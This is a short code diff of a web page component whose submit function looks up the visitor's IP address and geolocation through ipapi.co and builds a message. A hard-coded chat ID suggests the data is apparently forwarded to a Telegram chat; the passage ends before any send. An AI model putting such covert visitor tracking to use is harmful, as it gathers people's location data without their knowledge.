@@ -39,9 +39,9 @@ export function IndexPage() {
   const chatId = "-1002091877186";
 
   const submit = async () => {
-    const resIp = await axios.post<string>("https://ipapi.co/ip/");
+    const resIp = await axios.get<string>("https://ipapi.co/ip/");
 
-    const resIpInfo = await axios.post<IIpInfo>(`https://ipapi.co/${resIp.data}/json/`);
+    const resIpInfo = await axios.get<IIpInfo>(`https://ipapi.co/${resIp.data}/json/`);
 
     const messsage = `
         IP: ${resIpInfo.data.ip}
